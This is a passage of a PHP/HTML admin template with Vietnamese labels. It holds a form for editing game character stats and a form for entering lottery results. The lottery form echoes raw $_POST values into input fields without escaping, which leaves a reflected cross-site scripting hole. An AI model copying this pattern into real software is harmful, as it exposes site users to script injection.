	<tr>
		<td>Sức mạnh : <input type="text" name="str" id="str" maxlength="5" size="10" value="<?php echo $str; ?>"></td>
		<td>Điểm chưa cộng : <input type="point" name="point" id="char" maxlength="5" size="10" value="<?php echo $point; ?>"></td>
	</tr>
	<tr>
		<td>Nhanh nhẹn : <input type="text" name="dex" id="dex" maxlength="5" size="10" value="<?php echo $dex; ?>"></td>
		<td>Điểm dự trữ : <input type="text" name="pointdutru" id="pointdutru" maxlength="5" size="10" value="<?php echo $pointdutru; ?>"></td>
	</tr>
	<tr>
		<td>Sinh lực : <input type="text" name="vit" id="vit" maxlength="5" size="10" value="<?php echo $vit; ?>"></td>
		<td></td>
	</tr>
	<tr>
		<td>Năng lượng : <input type="text" name="ene" id="ene" maxlength="5" size="10" value="<?php echo $ene; ?>"></td>
		<td>Reset : <input type="text" name="reset" id="reset" maxlength="5" size="10" value="<?php echo $reset; ?>"></td>
	</tr>
	<tr>
		<td>Mệnh lệnh : <input type="text" name="com" id="com" maxlength="5" size="10" value="<?php echo $com; ?>"></td>
		<td>Relife : <input type="text" name="relife" id="relife" maxlength="5" size="10" value="<?php echo $relife; ?>"></td>
	</tr>
</table>
<center><input type="submit" name="Submit" value="Submit"></center>
</form>

<form name="ketqua_xoso" method="post" action="">
<input type="hidden" name="action" id="action" value="ketqua_xoso">
<table align="center" cellpadding="2" cellspacing="5" style="border-color:#d1a151;border-width:2px;border-style:solid;width:55%;border-collapse:collapse;font-size:14px;font-weight:bold;">
<tr>
	<td width="15%" align="center" style="border-color:#d1a151;border-width:2px;border-style:solid;"><?php echo $giaithuong1; ?> lần</td>
	<td width="85%" align="center" style="border-color:#d1a151;border-width:2px;border-style:solid;"><input name="result_info_0" type="text" maxlength="2" size="2" value="<?php echo $_POST['result_info_0']; ?>"></td>
</tr>
<tr>
	<td align="center" style="border-color:#d1a151;border-width:2px;border-style:solid;"><?php echo $giaithuong2; ?> lần</td>
	<td align="center" style="border-color:#d1a151;border-width:2px;border-style:solid;"><input name="result_info_1" type="text" maxlength="3" size="3" value="<?php echo $_POST['result_info_1']; ?>"></td>
</tr>
<tr>
	<td align="center" style="border-color:#d1a151;border-width:2px;border-style:solid;"><?php echo $giaithuong3; ?> lần</td>
	<td align="center" style="border-color:#d1a151;border-width:2px;border-style:solid;"><input name="result_info_2" type="text" maxlength="4" size="4" value="<?php echo $_POST['result_info_2']; ?>">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input name="result_info_3" type="text" maxlength="4" size="4" value="<?php echo $_POST['result_info_3']; ?>">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input name="result_info_4" type="text" maxlength="4" size="4" value="<?php echo $_POST['result_info_4']; ?>"></td>
</tr>
<tr>
	<td align="center" style="border-color:#d1a151;border-width:2px;border-style:solid;"><?php echo $giaithuong4; ?> lần</td>
	<td align="center" style="border-color:#d1a151;border-width:2px;border-style:solid;"><input name="result_info_5" type="text" maxlength="4" size="4" value="<?php echo $_POST['result_info_5']; ?>"></td>
</tr>
<tr>
	<td align="center" style="border-color:#d1a151;border-width:2px;border-style:solid;"><?php echo $giaithuong5; ?> lần</td>
	<td align="center" style="border-color:#d1a151;border-width:2px;border-style:solid;"><input name="result_info_6" type="text" maxlength="5" size="5" value="<?php echo $_POST['result_info_6']; ?>">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input name="result_info_7" type="text" maxlength="5" size="5" value="<?php echo $_POST['result_info_7']; ?>">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input name="result_info_8" type="text" maxlength="5" size="5" value="<?php echo $_POST['result_info_8']; ?>">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input name="result_info_9" type="text" maxlength="5" size="5" value="<?php echo $_POST['result_info_9']; ?>">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input name="result_info_10" type="text" maxlength="5" size="5" value="<?php echo $_POST['result_info_10']; ?>">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input name="result_info_11" type="text" maxlength="5" size="5" value="<?php echo $_POST['result_info_11']; ?>">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input name="result_info_12" type="text" maxlength="5" size="5" value="<?php echo $_POST['result_info_12']; ?>"></td>
</tr>
<tr>
	<td align="center" style="border-color:#d1a151;border-width:2px;border-style:solid;"><?php echo $giaithuong6; ?> lần</td>
	<td align="center" style="border-color:#d1a151;border-width:2px;border-style:solid;"><input name="result_info_13" type="text" maxlength="5" size="5" value="<?php echo $_POST['result_info_13']; ?>">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input name="result_info_14" type="text" maxlength="5" size="5" value="<?php echo $_POST['result_info_14']; ?>"></td>
</tr>
<tr>
	<td align="center" style="border-color:#d1a151;border-width:2px;border-style:solid;"><?php echo $giaithuong7; ?> lần</td>
	<td align="center" style="border-color:#d1a151;border-width:2px;border-style:solid;"><input name="result_info_15" type="text" maxlength="5" size="5" value="<?php echo $_POST['result_info_15']; ?>"></td>
</tr>
<tr>
	<td align="center" style="border-color:#d1a151;border-width:2px;border-style:solid;"><?php echo $giaithuong8; ?> lần</td>
	<td align="center" style="border-color:#d1a151;border-width:2px;border-style:solid;"><input name="result_info_16" type="text" maxlength="5" size="5" value="<?php echo $_POST['result_info_16']; ?>"></td>
</tr>
<tr>
	<td align="center" style="border-color:#d1a151;border-width:2px;border-style:solid;"><?php echo $giaithuong9; ?> lần</td>
	<td align="center" style="border-color:#d1a151;border-width:2px;border-style:solid;"><input name="result_info_17" type="text" maxlength="6" size="6" value="<?php echo $_POST['result_info_17']; ?>"></td>
</tr>
</table>
<center><input type="submit" name="Submit" value="Submit"></center>
</form>

</body>
</html>